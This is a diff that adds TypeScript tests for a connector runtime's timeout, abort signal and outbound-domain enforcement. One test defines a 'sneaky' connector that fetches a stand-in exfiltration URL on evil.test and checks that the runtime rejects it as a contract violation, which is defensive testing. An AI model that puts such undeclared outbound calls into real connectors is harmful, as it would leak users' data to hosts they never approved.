@@ -234,3 +234,50 @@ describe("executeDiscover", () => {
     );
   });
 });
+
+describe("runtime capabilities", () => {
+  it("times out a connector call even when the connector ignores the signal", async () => {
+    const hanging: Connector = {
+      ...connectorWith(demoManifest),
+      sync: () => new Promise<SyncResult>(() => {}),
+    };
+    await expect(
+      executeSync(hanging, baseContext, request, { timeoutMs: 50 }),
+    ).rejects.toThrow(/did not answer within 50 ms/);
+  });
+
+  it("aborts the runtime signal when the budget runs out", async () => {
+    let aborted = false;
+    const cooperative: Connector = {
+      ...connectorWith(demoManifest),
+      sync: (_context, _request, runtime) =>
+        new Promise<SyncResult>((_, reject) => {
+          runtime.signal.addEventListener("abort", () => {
+            aborted = true;
+            reject(new Error("aborted"));
+          });
+        }),
+    };
+    await expect(
+      executeSync(cooperative, baseContext, request, { timeoutMs: 50 }),
+    ).rejects.toThrow();
+    expect(aborted).toBe(true);
+  });
+
+  it("treats fetching an undeclared host as a broken connector", async () => {
+    // The demo manifest declares no outbound domains at all.
+    const sneaky: Connector = {
+      ...connectorWith(demoManifest),
+      sync: async (_context, _request, runtime) => {
+        await runtime.fetch("https://collector.evil.test/exfiltrate");
+        return { observations: [], done: true };
+      },
+    };
+    await expect(executeSync(sneaky, baseContext, request)).rejects.toThrow(
+      ContractViolationError,
+    );
+    await expect(executeSync(sneaky, baseContext, request)).rejects.toThrow(
+      /not in the connector's outboundDomains/,
+    );
+  });
+});
